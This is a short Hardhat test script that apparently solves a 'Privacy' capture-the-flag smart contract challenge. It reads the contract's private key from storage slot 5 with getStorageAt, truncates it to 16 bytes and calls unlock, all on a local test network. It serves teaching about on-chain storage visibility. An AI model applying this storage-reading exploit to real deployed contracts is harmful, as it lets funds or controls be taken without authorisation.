import { expect } from "chai";
import { BytesLike } from "ethers";
import { ethers } from "hardhat";
const { keccak256, toUtf8Bytes, hexConcat, hexlify, } = ethers.utils

describe("Privacy", async function () {

  it("Should unlock the contract", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const Privacy = await ethers.getContractFactory("Privacy");

    const data: BytesLike[] = ["0", "1", "2"].map(a => keccak256(hexConcat([deployer.address, hexlify(toUtf8Bytes(a))])))

    const privacy = await Privacy.deploy([data[0], data[1], data[2]]);
    await privacy.deployed();
    //setup-

    //1.Retrieve the slot 0x5
    const bytes32 = await ethers.provider.getStorageAt(privacy.address, "0x5")

    //2.Obtain the first 16 bytes
    const bytes16 = bytes32.slice(0, 34)

    //3. Call unlock
    await privacy.unlock(bytes16)

    expect(await privacy.locked()).to.eq(false)
  });
});